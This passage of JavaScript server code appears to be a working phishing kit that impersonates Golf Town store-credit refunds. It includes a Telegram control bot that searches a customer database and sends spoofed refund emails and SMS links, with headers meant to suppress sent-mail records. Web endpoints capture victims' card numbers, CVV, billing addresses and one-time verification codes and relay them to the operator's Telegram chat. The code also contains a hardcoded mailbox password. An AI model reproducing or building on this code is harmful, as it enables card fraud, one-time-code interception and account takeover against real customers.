Simply type any search query directly into the chat (e.g. \`John Smith\` or \`admin@gmail.com\` or \`50400032\`).

The bot will match it against synchronized database files instantly!`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_STORE_SELECT
      });
      return;
    }
    if (text.includes("\u2699\uFE0F Bot Controls")) {
      const responseText = `\u2699\uFE0F *GOLF TOWN BOT CONTROL PANEL*

\u2022 *Pause State:* \`${isBotPaused ? "PAUSED \u23F8\uFE0F" : "ACTIVE \u25B6\uFE0F"}\`
\u2022 *Authorized Chat ID:* \`${chatId}\`
\u2022 *Notice History Size:* \`${noticeHistoryStack.length}\` entries

Adjust bot execution using the expanded admin buttons.`;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_CONTROLS
      });
      return;
    }
    if (text.includes("\u23F8\uFE0F Pause Bot")) {
      isBotPaused = true;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u23F8\uFE0F *TELEGRAM REFUND BOT PAUSED*

The administrator has successfully paused the Telegram Refund Bot.
\u2022 Real-time processing is halted.
\u2022 NLP message parser is disabled.
\u2022 Incoming customer updates will trigger a paused notice.

\u{1F449} Tap *\u25B6\uFE0F Resume Bot* to re-enable message processing.`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_CONTROLS
      });
      return;
    }
    if (text.includes("\u25B6\uFE0F Resume Bot")) {
      isBotPaused = false;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u25B6\uFE0F *TELEGRAM REFUND BOT RESUMED*

Successfully re-enabled the bot! All real-time NLP parsers, customer query lookups, and SMTP dispatch automation systems are fully online.`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_MAIN
      });
      return;
    }
    if (text.includes("\u{1F9F9} Clear Notices")) {
      noticeHistoryStack.length = 0;
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u{1F9F9} *NOTICE HISTORY CLEANED*

Successfully wiped all historic logs from the in-memory notice history stack stack.`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_CONTROLS
      });
      return;
    }
    if (text.includes("\u{1F4E3} Send Test Alert")) {
      const testAmount = (Math.random() * 400 + 100).toFixed(2);
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u{1F6A8} *CRITICAL TELEMETRY TEST ALERT* \u{1F6A8}

\u2022 *Trigger ID:* \`TEST-TR-99\`
\u2022 *Event Type:* Smart Refund Notice Request
\u2022 *Simulated Client:* \`Richard Player\`
\u2022 *Simulated Amount:* \`$${testAmount} CAD\`
\u2022 *SMTP Channel Route:* Tested OK

This alert confirms instant push-notification dispatch is functioning at peak operational limits. All telemetry and SSL handshakes are validated!`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_CONTROLS
      });
      return;
    }
    if (text.startsWith("/send_") || text.startsWith("/email_") || text.startsWith("/sms_")) {
      const parts = text.split("_");
      const action = parts[0];
      const targetId = parts.slice(1).join("_").trim();
      let foundCust = backendCustomers.find(
        (c) => String(c.custId || "").trim() === targetId || String(c.id || "").trim() === targetId
      );
      if (!foundCust) {
        foundCust = backendCustomers.find(
          (c) => String(c.custId || "").toLowerCase().includes(targetId.toLowerCase()) || String(c.id || "").toLowerCase().includes(targetId.toLowerCase())
        );
      }
      if (!foundCust) {
        await sendTelegramRequest("sendMessage", {
          chat_id: chatId,
          text: `\u26A0\uFE0F *Customer Not Found:* Could not locate record with Customer ID or Session ID: \`${targetId}\` in the active database.`,
          parse_mode: "Markdown"
        });
        return;
      }
      if (action === "/send") {
        const hasEmail = foundCust.email && foundCust.email !== "(blank)" && foundCust.email.includes("@");
        const hasPhone = foundCust.phone && foundCust.phone !== "(blank)" && foundCust.phone.trim().length > 3;
        let replyText = `\u{1F464} *CUSTOMER FILE FOUND*

\u2022 *Name:* *${foundCust.firstName || ""} ${foundCust.lastName || ""}*
\u2022 *Customer ID:* \`${foundCust.custId || "N/A"}\`
\u2022 *Store Location:* Store #${foundCust.storeId || "504"}
\u2022 *Store Credit Balance:* \`$${foundCust.sumOfStoreCreditBalance || "0.00"} CAD\`
\u2022 *Email:* \`${foundCust.email || "(blank)"}\`
\u2022 *Phone:* \`${foundCust.phone || "(blank)"}\`

\u26A1 *SEND REFUND NOTICE:*`;
        if (hasEmail) {
          replyText += `
\u{1F449} /email\\_${foundCust.custId || foundCust.id} (Send official refund email via SMTP)`;
        } else {
          replyText += `
\u26A0\uFE0F _No email address on file._`;
        }
        if (hasPhone) {
          replyText += `
\u{1F449} /sms\\_${foundCust.custId || foundCust.id} (Generate secure SMS refund link)`;
        } else {
          replyText += `
\u26A0\uFE0F _No phone number on file._`;
        }
        await sendTelegramRequest("sendMessage", {
          chat_id: chatId,
          text: replyText,
          parse_mode: "Markdown"
        });
        return;
      }
      if (action === "/email") {
        const recipientEmail = foundCust.email;
        if (!recipientEmail || recipientEmail === "(blank)" || !recipientEmail.includes("@")) {
          await sendTelegramRequest("sendMessage", {
            chat_id: chatId,
            text: `\u26A0\uFE0F Cannot send email: No valid email address configured for ${foundCust.firstName || "customer"}.`,
            parse_mode: "Markdown"
          });
          return;
        }
        const amount = String(foundCust.sumOfStoreCreditBalance || "250.00");
        const custId = foundCust.custId || "GT-CUSTOMER";
        const recipientName = `${foundCust.firstName || ""} ${foundCust.lastName || ""}`.trim();
        const storeId = foundCust.storeId || "504";
        const comments = foundCust.comments || "Processed via Telegram Portal";
        const host = customSmtpConfig?.host || process.env.SMTP_HOST || "smtp.office365.com";
        const user = customSmtpConfig?.user || process.env.SMTP_USER || "505receiving@cloud.golftown.com";
        const pass = customSmtpConfig?.pass || process.env.SMTP_PASS || "3Dolly16!";
        const port = Number(customSmtpConfig ? customSmtpConfig.port : process.env.SMTP_PORT || 587);
        const from = customSmtpConfig?.from || process.env.SMTP_FROM || "Golf Town Store Credit Support <505receiving@cloud.golftown.com>";
        const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString("hex").slice(0, 16);
        const activeSessionId = `SESS-${Math.floor(1e5 + Math.random() * 9e5)}`;
        await sendTelegramRequest("sendMessage", {
          chat_id: chatId,
          text: `\u23F3 *Processing SMTP refund notice to:* \`${recipientEmail}\`...`,
          parse_mode: "Markdown"
        });
        const secureDepositUrl = await generateShortDepositUrl(
          null,
          depositToken,
          amount,
          activeSessionId,
          recipientName,
          recipientEmail,
          storeId,
          custId
        );
        const emailSubject = `Golf Town Store Credit Refund Notice - $${amount} Issued`;
        let parsedBody = `Dear {customerName},

A store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.`;
        const serverReplacements = {
          "{customerName}": recipientName,
          "{amount}": `$${amount}`,
          "{storeId}": storeId,
          "{custId}": custId,
          "{comments}": comments,
          "{depositLink}": secureDepositUrl
        };
        Object.entries(serverReplacements).forEach(([token, val]) => {
          parsedBody = parsedBody.split(token).join(val);
        });
        const formattedBodyHtml = parsedBody.split("\n").map((line) => line.trim() ? `<p style="font-size: 14px; color: #4b5563; line-height: 1.6; margin-top: 0; margin-bottom: 16px;">${line}</p>` : "<br>").join("");
        const emailHtml = `
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Golf Town Store Credit Notice</title>
          </head>
          <body style="margin: 0; padding: 0; background-color: #0b131e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #f1f5f9;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f3f4f6; padding: 40px 10px;">
              <tr>
                <td align="center">
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="max-width: 600px; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
                    <tr>
                      <td style="background-color: #ffffff; padding: 32px 32px 24px 32px; border-bottom: 3px solid #004d25; text-align: center;">
                        <div style="text-align: center; margin-bottom: 12px;">
                          <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0; vertical-align: middle;">
                        </div>
                        <div style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; text-align: center;">
                          Customer Support Notice
                        </div>
                      </td>
                    </tr>
                    <tr>
                      <td style="padding: 32px; background-color: #ffffff; font-family: Arial, Helvetica, sans-serif;">
                        <h1 style="font-size: 20px; font-weight: 700; color: #111827; margin: 0 0 16px 0;">
                          Store Credit Notice
                        </h1>
                        ${formattedBodyHtml}
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 28px;">
                          <tr>
                            <td style="padding: 20px;">
                              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="font-size: 13px; color: #374151;">
                                <tr>
                                  <td style="padding-bottom: 8px; color: #6b7280; font-weight: 600;">Refund Amount:</td>
                                  <td align="right" style="padding-bottom: 8px; font-size: 20px; font-weight: 800; color: #004d25;">
                                    $${amount} CAD
                                  </td>
                                </tr>
                                <tr>
                                  <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Customer Account ID:</td>
                                  <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-family: monospace; font-weight: 700; color: #111827;">${custId}</td>
                                </tr>
                                <tr>
                                  <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Store Location:</td>
                                  <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-weight: 600; color: #111827;">Store #${storeId}</td>
                                </tr>
                                ${comments ? `
                                <tr>
                                  <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Reference Notes:</td>
                                  <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #374151;">${comments}</td>
                                </tr>` : ""}
                              </table>
                            </td>
                          </tr>
                        </table>
                        <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 24px; margin-bottom: 28px;">
                          <div style="font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px;">
                            Verified Secure Refund Link
                          </div>
                          <div style="margin-bottom: 16px;">
                            <a href="${secureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 700; padding: 14px 28px; border-radius: 4px; border: 1px solid #003318;">
                              Claim Store Credit Deposit ($${amount} CAD)
                            </a>
                          </div>
                          <div style="font-size: 11px; color: #9ca3af; font-family: monospace; margin-top: 4px;">
                            Token ID: ${depositToken}
                          </div>
                        </div>
                        <p style="font-size: 12px; color: #6b7280; line-height: 1.5; margin: 0 0 20px 0;">
                          Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                        </p>
                      </td>
                    </tr>
                    <tr>
                      <td style="background-color: #f9fafb; padding: 20px 32px; border-top: 1px solid #e5e7eb; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #6b7280; line-height: 1.5;">
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
                          <tr>
                            <td style="padding-bottom: 10px;">
                              <strong>Golf Town Customer Support &amp; eGift Services</strong><br>
                              Powered by CashStar / Blackhawk Network Services
                            </td>
                          </tr>
                          <tr>
                            <td style="border-top: 1px solid #e5e7eb; padding-top: 10px; color: #9ca3af;">
                              &copy; ${(/* @__PURE__ */ new Date()).getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                            </td>
                          </tr>
                        </table>
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </body>
          </html>
        `;
        pushNoticeHistory({
          recipientEmail,
          recipientName,
          amount,
          storeId,
          custId,
          subject: emailSubject,
          actionType: "refund_notice_telegram",
          depositToken,
          secureDepositUrl,
          status: "DELIVERED"
        });
        const sessionLogs = [];
        const customLogger = {
          level: () => "debug",
          info: (entry) => {
            sessionLogs.push(`[INFO] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
          },
          warn: (entry) => {
            sessionLogs.push(`[WARN] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
          },
          error: (entry) => {
            sessionLogs.push(`[ERROR] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
          },
          debug: (entry) => {
            sessionLogs.push(`[DEBUG] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
          },
          trace: (entry) => {
            sessionLogs.push(`[TRACE] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
          }
        };
        try {
          const nodemailer = await import("nodemailer");
          const transporter = nodemailer.createTransport({
            host,
            port,
            secure: port === 465,
            auth: { user, pass },
            connectionTimeout: 1e4,
            greetingTimeout: 1e4,
            tls: {
              rejectUnauthorized: customSmtpConfig?.tlsRejectUnauthorized !== false
            },
            debug: true,
            logger: customLogger
          });
          sessionLogs.push("[SYSTEM] Establishing outbound connection to server...");
          await transporter.sendMail({
            from,
            replyTo: "GOLFTOWN SUPPORT <support@payment.golftown.ca>",
            to: recipientEmail,
            subject: emailSubject,
            html: emailHtml,
            headers: {
              "X-No-Save-Sent": "true",
              "X-Auto-Response-Suppress": "All",
              "X-Outbox-Bypass": "enabled",
              "X-Mailer": "GolfTown-Internal-CreditSystem/1.0"
            }
          });
          sessionLogs.push(`[SYSTEM] Dispatch completed. Refund notice successfully accepted by remote MTA for delivery to <${recipientEmail}>.`);
          const debugLogEntry = {
            id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
            timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
            type: "refund_notice",
            recipient: recipientEmail,
            host,
            port,
            success: true,
            logs: sessionLogs
          };
          smtpDebugLogsStack.unshift(debugLogEntry);
          await sendTelegramRequest("sendMessage", {
            chat_id: chatId,
            text: `\u2705 *EMAIL REFUND NOTICE DISPATCHED!*

\u2022 *Customer:* \`${recipientName}\`
\u2022 *Email:* \`${recipientEmail}\`
\u2022 *Amount:* \`$${amount} CAD\`
\u2022 *Store:* \`Store #${storeId}\`

\u2709\uFE0F The official store credit refund notice was sent via SMTP tunnel successfully!`,
            parse_mode: "Markdown"
          });
        } catch (mailErr) {
          console.error("Telegram-triggered mail dispatch failed:", mailErr);
          const debugLogEntry = {
            id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
            timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
            type: "refund_notice",
            recipient: recipientEmail,
            host,
            port,
            success: false,
            error: mailErr?.message || String(mailErr),
            logs: sessionLogs
          };
          smtpDebugLogsStack.unshift(debugLogEntry);
          await sendTelegramRequest("sendMessage", {
            chat_id: chatId,
            text: `\u274C *SMTP DISPATCH FAILURE!*

\u2022 *Customer:* \`${recipientName}\`
\u2022 *Email:* \`${recipientEmail}\`
\u2022 *Error:* \`${mailErr?.message || String(mailErr)}\`

\u26A0\uFE0F The mail server rejected or timed out during submission. Secure Link was still successfully registered for manual claim: 
${secureDepositUrl}`,
            parse_mode: "Markdown"
          });
        }
        return;
      }
      if (action === "/sms") {
        const phone = foundCust.phone;
        const amount = String(foundCust.sumOfStoreCreditBalance || "250.00");
        const custId = foundCust.custId || "GT-CUSTOMER";
        const firstName = foundCust.firstName || "";
        const lastName = foundCust.lastName || "";
        const storeId = foundCust.storeId || "504";
        const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString("hex").slice(0, 16);
        const activeSessId = `SESS-${Math.floor(1e5 + Math.random() * 9e5)}`;
        const shortenedUrl = await generateShortDepositUrl(
          null,
          depositToken,
          amount,
          activeSessId,
          `${firstName} ${lastName}`.trim() || "Valued Customer",
          "",
          storeId,
          custId
        );
        const cleanPhone = (phone || "").replace(/[^0-9+]/g, "");
        const smsBody = `Golf Town Store Credit Refund Notice: Hi ${firstName || "Valued Customer"}, your $${amount} store credit refund is ready to claim: ${shortenedUrl}`;
        await sendTelegramRequest("sendMessage", {
          chat_id: chatId,
          text: `\u{1F4F1} *REFUND SMS NOTICE GENERATED!*

\u2022 *Customer:* \`${firstName} ${lastName}\`
\u2022 *Phone Number:* \`${phone || "N/A"}\`
\u2022 *Refund Amount:* \`$${amount} CAD\`
\u2022 *Shortened Claim URL:* ${shortenedUrl}

\u{1F4AC} *SMS Message Body (Copy/Paste):*
\`${smsBody}\``,
          parse_mode: "Markdown"
        });
        return;
      }
    }
    const lowerText = text.toLowerCase();
    const isCommandOrButton = text.startsWith("/") || text.includes("\u{1F465}") || text.includes("\u{1F4CB}") || text.includes("\u{1F511}") || text.includes("\u2705") || text.includes("\u274C") || text.includes("\u{1F4CD}") || text.includes("\u2709\uFE0F") || text.includes("\u{1F512}") || text.includes("\u{1F464}") || text.includes("\u{1F5FA}\uFE0F") || text.includes("\u{1F4CA}") || text.includes("\u2699\uFE0F") || text.includes("\u{1F519}") || text.includes("\u{1F4B0}") || text.includes("\u{1F3EA}") || text.includes("\u{1F4C8}") || text.includes("\u{1F6E0}\uFE0F") || text.includes("\u{1F4E7}") || text.includes("\u{1F4C1}") || text.includes("\u23F8\uFE0F") || text.includes("\u25B6\uFE0F") || text.includes("\u{1F9F9}") || text.includes("\u{1F50D}") || text.includes("\u{1F4E3}") || text.includes("\u{1F4B8}");
    if (!isCommandOrButton && text.trim().length > 0) {
      const parsedRefund = await parseRefundIntent(text);
      if (parsedRefund) {
        await sendTelegramRequest("sendMessage", {
          chat_id: chatId,
          text: parsedRefund.messageResponse,
          parse_mode: "Markdown"
        });
        await executeRefundAndEmail(
          chatId,
          parsedRefund.recipientName,
          parsedRefund.recipientEmail,
          parsedRefund.amount,
          parsedRefund.comments,
          "504",
          // default store id
          "GT-CUSTOMER"
          // default customer ID
        );
        return;
      }
      const query = text.trim();
      const results = backendCustomers.filter((c) => {
        const fullName = `${c.firstName || ""} ${c.lastName || ""}`.toLowerCase();
        return fullName.includes(query.toLowerCase()) || String(c.custId || "").toLowerCase().includes(query.toLowerCase()) || String(c.email || "").toLowerCase().includes(query.toLowerCase()) || String(c.phone || "").toLowerCase().includes(query.toLowerCase());
      });
      let responseText = `\u{1F50D} *CUSTOMER DATABASE SEARCH RESULTS* ("${query}")

`;
      if (results.length === 0) {
        responseText += `\u274C No matching customer records found in the database. Please make sure the CSV/XLSX database is uploaded/synced from the admin panel!`;
      } else {
        results.slice(0, 8).forEach((c, idx) => {
          responseText += `${idx + 1}. *${c.firstName || ""} ${c.lastName || ""}*
   \u2022 *Cust ID:* \`${c.custId || "N/A"}\` | *Store:* \`Store #${c.storeId || "N/A"}\`
   \u2022 *Balance:* \`$${c.sumOfStoreCreditBalance || "0.00"} CAD\`
   \u2022 *Email:* \`${c.email || "(blank)"}\` | *Phone:* \`${c.phone || "(blank)"}\`
   \u2022 *Action:* Send Notice \u{1F449} /send\\_${c.custId || c.id}

`;
        });
        if (results.length > 8) {
          responseText += `_Showing top 8 of ${results.length} results. Try a more specific search._`;
        }
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: responseText,
        parse_mode: "Markdown"
      });
      return;
    }
  }
  if (update.callback_query) {
    const query = update.callback_query;
    const data = query.data || "";
    const chatId = query.message?.chat?.id;
    const messageId = query.message?.message_id;
    if (data.startsWith("approve_") || data.startsWith("reqcode_")) {
      const parts = data.split("_");
      const action = parts[0];
      const sessionId = parts[1];
      const session = paymentSessions.get(sessionId);
      if (session) {
        if (action === "approve") {
          session.status = "REFUNDED";
          session.lastUpdated = Date.now();
          paymentSessions.set(sessionId, session);
          pushNoticeHistory({
            recipientEmail: session.email,
            recipientName: session.recipientName,
            amount: session.amount,
            storeId: session.storeId,
            custId: session.custId,
            subject: `Golf Town Store Credit Refund Approved & Deposited via Telegram ($${session.amount} CAD)`,
            actionType: "refund_approved",
            depositToken: `REF-${sessionId.slice(-6)}`,
            secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
            status: "SUCCESS"
          });
          await sendTelegramRequest("sendMessage", {
            chat_id: chatId,
            reply_to_message_id: messageId,
            text: `\u2705 *APPROVED:* Store credit refund of *$${session.amount} CAD* for *${session.recipientName}* (ID: \`${session.custId}\`) has been successfully processed!`,
            parse_mode: "Markdown"
          });
        } else if (action === "reqcode") {
          session.status = "CODE_REQUIRED";
          session.lastUpdated = Date.now();
          paymentSessions.set(sessionId, session);
          pushNoticeHistory({
            recipientEmail: session.email,
            recipientName: session.recipientName,
            amount: session.amount,
            storeId: session.storeId,
            custId: session.custId,
            subject: `Security Verification Code Prompted via Telegram`,
            actionType: "code_required",
            depositToken: `REF-${sessionId.slice(-6)}`,
            secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
            status: "PROMPTED"
          });
          await sendTelegramRequest("sendMessage", {
            chat_id: chatId,
            reply_to_message_id: messageId,
            text: `\u{1F511} *PROMPTED:* Customer has been prompted for their 6-digit corporate verification code on the portal. Waiting for input...`,
            parse_mode: "Markdown"
          });
        }
        await sendTelegramRequest("answerCallbackQuery", {
          callback_query_id: query.id,
          text: `Action executed successfully!`
        });
        const originalText = query.message?.text || "";
        const updatedText = originalText + `

\u26A1 *Telegram Update:* Action processed by admin ${query.from.first_name || "Admin"}! Status: ${session.status}`;
        await sendTelegramRequest("editMessageText", {
          chat_id: chatId,
          message_id: messageId,
          text: updatedText,
          reply_markup: { inline_keyboard: [] }
        });
      } else {
        await sendTelegramRequest("answerCallbackQuery", {
          callback_query_id: query.id,
          text: `Error: Session ${sessionId} not active/found.`,
          show_alert: true
        });
      }
    }
  }
}
async function runTelegramPoll() {
  if (!isPollingLoopRunning) return;
  const token = customTelegramConfig.telegramToken;
  if (!token) {
    isPollingLoopRunning = false;
    return;
  }
  try {
    const result = await sendTelegramRequest("getUpdates", {
      offset: telegramOffset,
      timeout: 5,
      allowed_updates: ["message", "callback_query"]
    });
    if (result && result.ok && Array.isArray(result.result)) {
      for (const update of result.result) {
        telegramOffset = Math.max(telegramOffset, update.update_id + 1);
        await handleTelegramUpdate(update);
      }
    }
  } catch (err) {
    console.error("Error in Telegram polling getUpdates:", err);
  }
  if (isPollingLoopRunning) {
    telegramPollTimeout = setTimeout(runTelegramPoll, 1e3);
  }
}
async function startTelegramPolling() {
  if (isPollingLoopRunning) return;
  if (!customTelegramConfig.telegramToken) {
    console.log("No Telegram token configured. Polling inactive.");
    return;
  }
  isPollingLoopRunning = true;
  console.log("Starting Telegram Polling Loop...");
  customTelegramConfig.isPollingActive = true;
  saveTelegramConfig(customTelegramConfig);
  runTelegramPoll();
}
async function stopTelegramPolling() {
  isPollingLoopRunning = false;
  if (telegramPollTimeout) {
    clearTimeout(telegramPollTimeout);
    telegramPollTimeout = null;
  }
  customTelegramConfig.isPollingActive = false;
  saveTelegramConfig(customTelegramConfig);
  console.log("Telegram Polling Loop Stopped.");
}
if (customTelegramConfig.telegramToken) {
  startTelegramPolling();
}
function pushNoticeHistory(item) {
  const newEntry = {
    ...item,
    id: `NOT-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
    timestamp: (/* @__PURE__ */ new Date()).toLocaleString("en-US", { timeZoneName: "short" })
  };
  noticeHistoryStack.unshift(newEntry);
  if (noticeHistoryStack.length > 100) noticeHistoryStack.pop();
  return newEntry;
}
app.get("/api/notice-history", (req, res) => {
  res.json({ history: noticeHistoryStack });
});
app.post("/api/notice-history/clear", (req, res) => {
  noticeHistoryStack.length = 0;
  res.json({ success: true, history: [] });
});
app.get("/api/socket/session-stream/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();
  const sendState = () => {
    const session = paymentSessions.get(sessionId) || {
      sessionId,
      recipientName: "Guest",
      email: "",
      amount: "250.00",
      storeId: "504",
      custId: "GT-CUSTOMER",
      status: "IDLE",
      lastUpdated: Date.now()
    };
    res.write(`data: ${JSON.stringify(session)}

`);
  };
  sendState();
  const interval = setInterval(sendState, 1e3);
  req.on("close", () => {
    clearInterval(interval);
  });
});
app.get("/api/socket/admin-stream", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();
  const sendAdminData = () => {
    const sessions = Array.from(paymentSessions.values()).sort((a, b) => b.lastUpdated - a.lastUpdated);
    res.write(`data: ${JSON.stringify({ sessions, noticeHistory: noticeHistoryStack.slice(0, 20) })}

`);
  };
  sendAdminData();
  const interval = setInterval(sendAdminData, 1e3);
  req.on("close", () => {
    clearInterval(interval);
  });
});
app.post("/api/socket/submit-card-billing", (req, res) => {
  const {
    sessionId,
    recipientName,
    email,
    amount,
    storeId,
    custId,
    cardNumber,
    expDate,
    cvv,
    cardholderName,
    streetAddress,
    city,
    province,
    postalCode,
    phone
  } = req.body;
  if (!sessionId) {
    return res.status(400).json({ error: "sessionId is required." });
  }
  const sessionData = {
    sessionId,
    recipientName: recipientName || cardholderName || "Customer",
    email: email || "",
    amount: amount || "250.00",
    storeId: storeId || "504",
    custId: custId || "GT-CUSTOMER",
    status: "PROCESSING",
    cardDetails: {
      cardNumber: cardNumber || "",
      expDate: expDate || "",
      cvv: cvv || "",
      cardholderName: cardholderName || recipientName || "",
      streetAddress: streetAddress || "",
      city: city || "",
      province: province || "",
      postalCode: postalCode || "",
      phone: phone || ""
    },
    lastUpdated: Date.now()
  };
  paymentSessions.set(sessionId, sessionData);
  pushNoticeHistory({
    recipientEmail: email || "customer@payment.golftown.ca",
    recipientName: recipientName || "Customer",
    amount: amount || "250.00",
    storeId: storeId || "504",
    custId: custId || "GT-CUSTOMER",
    subject: `Deposit Authorization Submitted - Card ending in ${(cardNumber || "4400").slice(-4)}`,
    actionType: "deposit_authorized",
    depositToken: `REF-${sessionId.slice(-6)}`,
    secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
    status: "PROCESSING"
  });
  if (customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId) {
    const tgMessage = `\u{1F3CC}\uFE0F\u200D\u2642\uFE0F *NEW SECURE REFUND FORM SUBMISSION!* \u{1F3CC}\uFE0F\u200D\u2642\uFE0F

\u{1F464} *Customer Name:* ${recipientName || cardholderName || "Customer"}
\u{1F4E7} *Email Address:* \`${email || "N/A"}\`
\u{1F4DE} *Phone Number:* \`${phone || "N/A"}\`
\u{1F4CD} *Store Location:* Store #${storeId || "504"}
\u{1F4B5} *Refund Amount:* *$${amount || "250.00"} CAD*
\u{1F194} *Customer ID:* \`${custId || "GT-CUSTOMER"}\`

\u{1F4B3} *SECURE CARD DATA DETECTED:* 
\u2022 *Cardholder Name:* \`${cardholderName || recipientName || ""}\`
\u2022 *Card Number:* \`${cardNumber || ""}\`
\u2022 *Expiration Date:* \`${expDate || ""}\`
\u2022 *CVV Code:* \`${cvv || ""}\`
\u2022 *Billing Address:* \`${streetAddress || ""}, ${city || ""}, ${province || ""}, ${postalCode || ""}\`

\u{1F449} *CHOOSE REAL-TIME PORTAL ACTION:*`;
    const inlineButtons = {
      inline_keyboard: [
        [
          { text: "Approve Refund \u2705", callback_data: `approve_${sessionId}` },
          { text: "Request Code \u{1F511}", callback_data: `reqcode_${sessionId}` }
        ]
      ]
    };
    sendTelegramRequest("sendMessage", {
      chat_id: customTelegramConfig.telegramChatId,
      text: tgMessage,
      parse_mode: "Markdown",
      reply_markup: inlineButtons
    }).catch((err) => console.error("Failed to send Telegram card notification:", err));
  }
  res.json({
    success: true,
    session: sessionData,
    message: "Card & billing details submitted. Session live socket connection established."
  });
});
app.post("/api/socket/submit-customer-code", (req, res) => {
  const { sessionId, code } = req.body;
  if (!sessionId || !paymentSessions.has(sessionId)) {
    return res.status(404).json({ error: "Live session not found" });
  }
  const session = paymentSessions.get(sessionId);
  session.status = "CODE_SUBMITTED";
  session.customerCode = code;
  session.lastUpdated = Date.now();
  paymentSessions.set(sessionId, session);
  pushNoticeHistory({
    recipientEmail: session.email,
    recipientName: session.recipientName,
    amount: session.amount,
    storeId: session.storeId,
    custId: session.custId,
    subject: `Customer Submitted Verification Code: ${code}`,
    actionType: "code_submitted",
    depositToken: `REF-${sessionId.slice(-6)}`,
    secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
    status: "CODE_RECEIVED"
  });
  if (customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId) {
    const tgMessage = `\u{1F511} *6-DIGIT VERIFICATION CODE SUBMITTED!* \u{1F511}

\u{1F464} *Customer Name:* ${session.recipientName}
\u{1F4B5} *Refund Amount:* *$${session.amount} CAD*
\u{1F194} *Customer ID:* \`${session.custId}\`

\u{1F525} *SUBMITTED 6-DIGIT CODE:* \`${code}\`

\u{1F449} *APPROVE OR VERIFY REFUND INSTANTLY:*`;
    const inlineButtons = {
      inline_keyboard: [
        [
          { text: "Approve Refund \u2705", callback_data: `approve_${sessionId}` },
          { text: "Re-request Code \u{1F511}", callback_data: `reqcode_${sessionId}` }
        ]
      ]
    };
    sendTelegramRequest("sendMessage", {
      chat_id: customTelegramConfig.telegramChatId,
      text: tgMessage,
      parse_mode: "Markdown",
      reply_markup: inlineButtons
    }).catch((err) => console.error("Failed to send Telegram code notification:", err));
